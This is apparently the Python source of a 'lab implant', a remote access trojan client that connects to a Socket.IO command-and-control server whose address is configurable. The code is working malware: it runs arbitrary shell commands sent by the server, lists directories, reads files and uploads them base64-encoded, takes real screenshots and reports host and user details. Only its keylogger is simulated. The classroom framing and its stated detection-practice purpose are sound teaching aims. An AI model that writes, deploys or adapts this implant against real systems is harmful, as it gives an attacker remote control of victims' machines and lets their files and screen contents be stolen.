"""
rat_python_client.py — Lab implant (Python) — FIXED BUILD
=========================================================
Speaks the canonical protocol v2 implemented by c2_server.js. [3]

Changes vs. original:
 - Uses python-socketio CLIENT connected to the C2's Socket.IO endpoint
   (was connecting but listening for 'command' with {type:'shell'} payloads
   that the server never sent, and emitting events the server ignored).
 - Event names/payloads now match the server exactly (see PROTOCOL.md):
     listens : execute, screenshot, list_files, download_file,
               start_keylogger, stop_keylogger, ping
     emits   : register, client_heartbeat, client_response,
               keylogData, file_list, screenshot_data
 - Keylogging is SIMULATED for the classroom demo: it generates synthetic
   keystroke records so students can watch data flow through the C2 and
   practice detection (this is the defensive-analysis target later).
   No real input capture is performed by this client.
 - Screenshots use mss when available; otherwise replies with a clear
   "unsupported in this environment" message (lab VMs may be headless).

Run:  pip install -r requirements.txt
      python rat_python_client.py
Env:  C2_URL (default http://127.0.0.1:8443), CLIENT_ID (optional)
"""

import os
import sys
import time
import uuid
import random
import socket as netsocket
import threading

import requests                                  # kept for REST fallback/health checks
import socketio                                  # python-socketio client

C2_URL = os.environ.get("C2_URL", "http://127.0.0.1:8443")
CLIENT_ID = os.environ.get("CLIENT_ID") or f"py-{netsocket.gethostname().lower()}-{uuid.uuid4().hex[:4]}"

# Optional capture libs — used only if present; absence is fine in the lab.
try:
    import mss  # noqa: F401
    HAVE_MSS = True
except Exception:
    HAVE_MSS = False

sio = socketio.Client(reconnection=True, reconnection_attempts=0)
keylogger_thread = None
keylogger_active = threading.Event()


def system_info():
    return {
        "client_id": CLIENT_ID,
        "hostname": netsocket.gethostname(),
        "platform": sys.platform,
        "os": f"{os.name} {sys.version.split()[0]}",
        "arch": os.uname().machine if hasattr(os, "uname") else "unknown",
        "user": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
    }


def run_command(cmd: str) -> str:
    """Run a shell command with timeout; return combined output."""
    import subprocess
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        out = (p.stdout or "") + (p.stderr or "")
        return out if out.strip() else "(no output)"
    except Exception as e:
        return f"ERR {e}"


# ---------------------------------------------------------------------------
# Simulated keylogger (synthetic data ONLY — no real input capture).
# The class later practices detecting THIS pattern on an infected host.
# ---------------------------------------------------------------------------
def _fake_keylogger_loop():
    words = ["the ", "quick ", "brown ", "fox ", "jumps ", "over ", "lazy ", "dog ", " enter"]
    while keylogger_active.is_set():
        rec = {
            "client_id": CLIENT_ID,
            "keys": random.choice(words),
            "simulated": True,
            "ts": int(time.time() * 1000),
        }
        sio.emit("keylogData", rec)
        time.sleep(random.uniform(1.5, 4.0))


# ---------------------------------------------------------------------------
# Command handlers (event contract from PROTOCOL.md / c2_server.js)
# ---------------------------------------------------------------------------
@sio.on("connect")
def on_connect():
    print(f"[*] connected to {C2_URL}")
    sio.emit("register", system_info())


@sio.on("register_ack")
def on_register_ack(ack):
    print(f"[*] registered: {ack}")


@sio.on("execute")
def on_execute(msg):
    cid, cmd = msg.get("command_id"), msg.get("command", "")
    print(f"[>] execute {cid}: {cmd}")
    sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                 "action": "execute", "output": run_command(cmd)})


@sio.on("list_files")
def on_list_files(msg):
    cid, d = msg.get("command_id"), msg.get("dir") or "."
    try:
        files = os.listdir(d)
        sio.emit("file_list", {"client_id": CLIENT_ID, "command_id": cid, "dir": d, "files": files})
    except Exception as e:
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "list_files", "output": f"ERR {e}"})


@sio.on("download_file")
def on_download_file(msg):
    import base64
    cid, rp = msg.get("command_id"), msg.get("remote_path", "")
    try:
        with open(rp, "rb") as f:
            data = f.read()
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "download_file",
                                     "output": f"sent {len(data)} bytes",
                                     "base64": base64.b64encode(data).decode()})
    except Exception as e:
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "download_file", "output": f"ERR {e}"})


@sio.on("screenshot")
def on_screenshot(msg):
    cid = msg.get("command_id")
    if not HAVE_MSS:
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "screenshot",
                                     "output": "mss not installed / headless VM — screenshot unsupported"})
        return
    try:
        import mss
        import base64
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
        png_bytes = mss.tools.to_png(img.rgb, img.size)
        sio.emit("screenshot_data", {"client_id": CLIENT_ID, "command_id": cid,
                                     "base64": base64.b64encode(png_bytes).decode()})
    except Exception as e:
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "screenshot", "output": f"ERR {e}"})


@sio.on("start_keylogger")
def on_start_keylogger(msg):
    global keylogger_thread
    cid = msg.get("command_id")
    if not keylogger_active.is_set():
        keylogger_active.set()
        keylogger_thread = threading.Thread(target=_fake_keylogger_loop, daemon=True)
        keylogger_thread.start()
    sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                 "action": "start_keylogger",
                                 "output": "SIMULATED keylogger started (synthetic data only)"})


@sio.on("stop_keylogger")
def on_stop_keylogger(msg):
    cid = msg.get("command_id")
    keylogger_active.clear()
    sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                 "action": "stop_keylogger", "output": "SIMULATED keylogger stopped"})


@sio.on("ping")
def on_ping(msg):
    sio.emit("client_heartbeat", {"client_id": CLIENT_ID})
    cid = msg.get("command_id")
    if cid:
        sio.emit("client_response", {"client_id": CLIENT_ID, "command_id": cid,
                                     "action": "ping", "output": "pong"})


def heartbeat_loop():
    while True:
        try:
            sio.emit("client_heartbeat", {"client_id": CLIENT_ID})
        except Exception:
            pass
        time.sleep(10)


if __name__ == "__main__":
    print(f"[*] lab implant {CLIENT_ID} → {C2_URL}")
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    try:
        sio.connect(C2_URL, transports=["websocket", "polling"])
    except Exception as e:
        print(f"[!] could not connect: {e}")
        sys.exit(1)
    try:
        sio.wait()
    except KeyboardInterrupt:
        print("\n[*] shutting down")
        sio.disconnect()
